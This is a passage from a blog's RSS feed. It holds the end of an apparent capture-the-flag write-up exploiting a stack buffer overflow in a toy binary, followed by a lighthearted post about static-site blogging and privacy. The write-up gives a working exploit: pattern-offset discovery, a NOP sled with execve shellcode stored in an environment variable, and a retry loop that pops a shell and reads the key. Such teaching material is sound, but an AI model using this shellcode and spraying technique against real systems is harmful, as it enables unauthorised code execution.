&lt;p&gt;My goal was to find an &amp;ldquo;instruction gadget&amp;rdquo; within the static mapping that would effectively work as a &lt;code&gt;JMP ESP&lt;/code&gt; or &lt;code&gt;CALL ESP&lt;/code&gt;. Using &lt;code&gt;hexdump -C | grep FF&lt;/code&gt; I looked for &lt;code&gt;FF E4&lt;/code&gt; or &lt;code&gt;FF D4&lt;/code&gt; sequences. This is an extremely crude way to do this, but keep in mind the binary is very small. Unfortunately, &lt;em&gt;because&lt;/em&gt; it&amp;rsquo;s so small, there was also no occurence of either byte sequence.&lt;/p&gt;

&lt;p&gt;If any of the general-purpose registers at the time of the function return happen to also hold pointers to the stack range, then we could trampoline through a &lt;code&gt;JMP EAX/EBX/ECX/EDX&lt;/code&gt; or &lt;code&gt;CALL EAX/EBX/ECX/EDX&lt;/code&gt;, etc. So I also looked for any of these sequences. I found an &lt;code&gt;FF D0 (call EAX)&lt;/code&gt;, and a &lt;code&gt;FF D2 (call EDX)&lt;/code&gt;! Good, but do we control either of those registers? Check: &lt;code&gt;(gdb) info registers&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;eax            0x0      0                         
ebx            0xffa5d5a0       -5909088
ecx            0xf7726878       -143497096
edx            0x0      0
‚Ä¶
esp            0xffa5d56c       0xffa5d56c
ebp            0xffa5d588       0xffa5d588 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;annnnd no, they‚Äôre both 0x0 by the time the attacker gets control of &lt;code&gt;EIP&lt;/code&gt;. But what&amp;rsquo;s this, &lt;code&gt;EBX&lt;/code&gt; points into the stack (verified by another look at the &lt;code&gt;/proc/PID/maps&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ffa3e000-ffa5f000 rwxp 00000000 00:00 0		[stack]  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But alas, poring over the hexdump of the static mappings in memory, there is no &lt;code&gt;CALL EBX (FF D3)&lt;/code&gt; or &lt;code&gt;JMP EBX (FF E3)&lt;/code&gt; gadgets! There&amp;rsquo;s not even something more indirect, like a &lt;code&gt;PUSH EBX; RET (53 C3&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Another idea was to try to jump to one of the &lt;code&gt;GOT&lt;/code&gt; entries, but this is a tiny little toy binary! It doesn&amp;rsquo;t import anything useful, as we see with &lt;code&gt;objdump -T&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;DYNAMIC SYMBOL TABLE:                                                          
00000000      DF *UND*  00000000  GLIBC_2.0   printf                           
00000000      DF *UND*  00000000  GLIBC_2.0   fflush                           
00000000      DF *UND*  00000000  GLIBC_2.0   getegid                          
00000000      DF *UND*  00000000  GLIBC_2.0   puts                             
00000000  w   D  *UND*  00000000              __gmon_start__                   
00000000      DF *UND*  00000000  GLIBC_2.0   __libc_start_main                
00000000      DF *UND*  00000000  GLIBC_2.0   sprintf                          
00000000      DF *UND*  00000000  GLIBC_2.0   setresgid                        
08049a40 g    DO .bss   00000004  GLIBC_2.0   stdout                           
0804872c g    DO .rodata        00000004  Base        _IO_stdin_used 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If there was a &lt;code&gt;system()&lt;/code&gt; in here or something it would be a different story maybe, but as is, there are no useful standard library calls in this table.&lt;/p&gt;

&lt;p&gt;The ROP approach to this has failed me.&lt;/p&gt;

&lt;h2 id=&#34;phoning-a-friend&#34;&gt;Phoning a Friend&lt;/h2&gt;

&lt;p&gt;At this point I called a smart friend of mine for a tip on how to jump the instruction pointer to this stupid shellcode on the stack. We discussed more advanced gadget-finding using Z3 solvers and all sorts of stuff, but ultimately the hints that stuck with me were:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Duh, you can stack spray like it&amp;rsquo;s 1992: just make your input 100KB, NOP-sled to the end where shellcode lies, and re-run the exploit until it works by chance (until the input happens to inhabit a range around the address we choose to put in the overflowed return pointer).&lt;/li&gt;
&lt;li&gt;You can store an arbitrary amount of NOP-sled in an environment variable and it will all get located in the stack segment.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;making-it-work&#34;&gt;Making It Work&lt;/h2&gt;

&lt;p&gt;Okay, so I have a good idea of how to (messily and probabilistically) get a successful exploit. The only thing I skipped over earlier was determining exactly how many bytes offset into the attack input we need to place the pointer. The way you do this is to use an exploit pattern string, such as you can &lt;a href=&#34;http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/&#34;&gt;generate online here&lt;/a&gt; or offline using &lt;a href=&#34;https://github.com/Svenito/exploit-pattern/blob/master/pattern.py&#34;&gt;various tools&lt;/a&gt;, and then watch the value of &lt;code&gt;EIP&lt;/code&gt; when the process crashes under GDB:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ gdb --args ./overflowme Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
(gdb) b vuln
(gdb) run
(gdb) ni
# etc ...
(gdb) info registers
# I observe that the bytes from the pattern that fill EIP (little endian, remember) are &amp;quot;g8Bg&amp;quot;.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I chose a pointer that was in the middlish-range for the stack: 0xff881111, converted it into little-endian order, and put it into the attack string at the same location. We can confirm:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ gdb --args ./overflowme $(python -c &#39;print &amp;quot;A&amp;quot;*985 + &amp;quot;\x11\x11\x88\xff&amp;quot;&#39;)
(gdb) b vuln
(gdb) run
(gdb) ni
# etc ...
(gdb) info registers
# I observe that EIP is 0xff881111. Maybe it doesn&#39;t point into the stack on THIS run but it sometimes will, which is all we need, since we&#39;re allowed to retry the attack until it does.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Putting it all together:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Store a NOP sled of 0x90 bytes and the shellcode at the end, in the stack via an env. var.:
$ export SHELLCODE=$(python -c &#39;print &amp;quot;\x90&amp;quot;*100000 + &amp;quot;\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80&amp;quot;&#39;)

# Point to the stack, and keep running the attack until it works: the ol&#39; &amp;quot;spray &amp;amp; pray&amp;quot;
$ for i in {1..100}; do ./overflowme $(python -c &#39;print &amp;quot;A&amp;quot;*985 + &amp;quot;\x11\x11\x88\xff&amp;quot;&#39;); done

# Boom, it pops a shell:
$ ls
key  overflowme  overflowme.c                                                  
$ cat key
bb379544581fa2b010d958d6e78addfa
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>How to Blog in 2017</title>
      <link>https://michael-myers.github.io/blog/post/static-site-generators/</link>
      <pubDate>Fri, 03 Feb 2017 15:43:53 -0500</pubDate>
      
      <guid>https://michael-myers.github.io/blog/post/static-site-generators/</guid>
      <description>&lt;p&gt;My first blog, back in the early 2000s, was on a hosted blogging platform known as &lt;a href=&#34;https://en.wikipedia.org/wiki/Blogger_(service)&#34;&gt;Blogger&lt;/a&gt;. It was simple and convenient: as the admin you just logged into the Blogger service, edited posts in your browser, and hit publish. This is basically how Tumblr still works today, although Tumblr&amp;rsquo;s innovation was to include media file hosting and allow everyone to repost each others&amp;rsquo; content.&lt;/p&gt;

&lt;p&gt;But Blogger content was &lt;em&gt;static&lt;/em&gt;, and textual. You could post a few paragraphs of text, and embed images if they were hosted elsewhere. Only later did Google buy out the service and integrate it with their photo-hosting service. In the mid-2000s, many geeks wanted more flexibility, like the ability to limit access to members only, integrate their own photo/video/audio collections, and ‚Äì most importantly ‚Äì control the appearance of their blog.&lt;/p&gt;

&lt;p&gt;So my second blog was generated with a Web Content Management System (CMS) and self-hosted on a home Windows XP PC running the &amp;ldquo;&lt;a href=&#34;https://en.wikipedia.org/wiki/LAMP_%28software_bundle%29#WAMP&#34;&gt;WAMP&lt;/a&gt;&amp;rdquo; software stack, with a DNS record from a free dynamic DNS service. If you&amp;rsquo;re a system admin or security expert you&amp;rsquo;re probably cringing. I am too. In hindsight, it&amp;rsquo;s a miracle if that PC was not 0wned by a hacker at some point, but at least I have no evidence to believe it was. But I thought my blog was pretty cool, it had a custom look, custom domain name, its own forums, file storage, a weather widget on the sidebar. I believe it was using the &lt;a href=&#34;https://en.wikipedia.org/wiki/Drupal&#34;&gt;Drupal CMS&lt;/a&gt;. The 2000s saw this rise of the &amp;ldquo;web app,&amp;rdquo; a concept that an application was something that ran in a scripting language on a web server and presented you with a web page as the user interface. As a system programmer who thinks an application is a single self-contained compiled binary, I thought this was an anathema. But the rest of the tech world decided otherwise: websites that were not database-backed and server-side-scripted were totally 90s! That meant lame. 90s wasn&amp;rsquo;t cool again yet.&lt;/p&gt;

&lt;p&gt;The reason why the self-hosted CMS approach to blogging is cringey is that it is notoriously difficult to secure a CMS, especially one written in PHP. PHP is now known to be prone to reoccuring security issues because of flaws in its design (unvalidated input, access control problems, command injection issues, etc.), and the use of a SQL database means fighting a war agains SQL injection attacks from anyone who uses your site. Spammers will leave spam comments. You just want to run a blog, but now you&amp;rsquo;re a system admin for a web server, a database admin for a database, and you have to understand the PHP (or Java, or whatever) that generates your site on the fly every time a visitor loads a page. If you ever want to use a web hosting service for your CMS-based site instead of hosting it at home, you have to pay real money, because supporting and securing Apache, PHP, and MySQL is a full-time job! On top of all of that, all of this script and database stuff makes the site is slower to load, and prone to Denial of Service attacks.&lt;/p&gt;

&lt;p&gt;This is no way to live. And so, as is typical, the tech community decided that what is old is new again, and that static sites were actually a good idea that should never have been abandoned. Rolling my eyes so hard I went temporarily blind, I actually resisted even caring about the cool way to blog in the 2010s. I used LiveJournal for a bit. I tried a hosted Wordpress (Wordpress.com) account to blog about game console emulators. I got into using Tumblr, even though (or maybe &lt;em&gt;because&lt;/em&gt;) the tech community is not on there. But now I&amp;rsquo;ve decided to give a fresh look at what&amp;rsquo;s fresh, and give it a chance.&lt;/p&gt;

&lt;p&gt;Here are some things I noticed about the current Preferred Way for Cool Kids to Blog.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If you write any kind of code for a living, you host it on a free hosting service in the .io TLD. This is just what is fashionable, and like all fashion choices, it can&amp;rsquo;t really be explained. &amp;ldquo;Everyone is doing it&amp;rdquo;, including this blog. We are not all hosting sites in the British Indian Ocean Territory, but yes, this TLD exists because the UK &lt;a href=&#34;https://en.wikipedia.org/wiki/Depopulation_of_Chagossians_from_the_Chagos_Archipelago&#34;&gt;stole some Pacific Islanders&amp;rsquo; land&lt;/a&gt; during the Cold War, and its only other claim to fame might be &lt;a href=&#34;http://content.time.com/time/world/article/0,8599,1828469,00.html&#34;&gt;its black site CIA torture prison&lt;/a&gt;. How&amp;rsquo;s that for oblivious Silicon Valley tech privilege!&lt;/li&gt;
&lt;li&gt;Because HTML, JS, and CSS are nearly impossible to work in directly anymore (much like assembly code), people write their web page content in a highly simplified markup language, and then run &lt;em&gt;that&lt;/em&gt; through a compiler (oh, sorry, &lt;em&gt;static site generator&lt;/em&gt;) to produce a web site in actual HTML, JS, and CSS. The output is then posted to a web hosting service. There are some &lt;a href=&#34;https://staticsitegenerators.net&#34;&gt;450 static site generators&lt;/a&gt; to choose from. This site uses Hugo, which I&amp;rsquo;ll talk about in a future post. An even more popular choice is Jekyll, which is fine‚Ä¶for me to poop on.&lt;/li&gt;
&lt;li&gt;The simplified markup language of choice currently is &lt;a href=&#34;https://en.wikipedia.org/wiki/Markdown&#34;&gt;Markdown&lt;/a&gt;, which will also be the subject of a future post because it is pretty neat.&lt;/li&gt;
&lt;li&gt;Because supporting the ability for visitors to post comments would require a dynamic site, static sites have outsourced this responsibility to third-party services. That is, comments are implemented with an embedded JavaScript element that is loaded from a remote service. The dominant choice of service at the moment is &lt;a href=&#34;https://en.wikipedia.org/wiki/Disqus&#34;&gt;Disqus&lt;/a&gt;. This and any other user-account-based service that embeds its content on your blog is a privacy problem: it means Disqus is basically assigning you an identifier and following you around to all of the Disqus-enabled sites you visit. &lt;a href=&#34;https://www.ghostery.com&#34;&gt;Ghostery&lt;/a&gt; blocks Disqus by default, for this reason. I suggest using Twitter to reach me if you have a comment.&lt;/li&gt;
&lt;li&gt;Because static sites cannot track how many visitors they get and where they visited from, that too has been outsourced. &lt;a href=&#34;https://en.wikipedia.org/wiki/Google_Analytics&#34;&gt;Google Analytics&lt;/a&gt; is now more prevalent than HPV and herpes combined. I have had to delete it out of every web-related code repository that I have borrowed to make anything. Even if I&amp;rsquo;m the last one on Earth who cares about privacy, I will not be including that here. The same goes for social media sharing links. You&amp;rsquo;re a big boy and/or girl, I bet you&amp;rsquo;ll figure out how to share a URL yourself!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So there you have it, my take on the Way to Blog in the 2010s for Cool Kids. Thanks for reading. ‚Äì MM&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>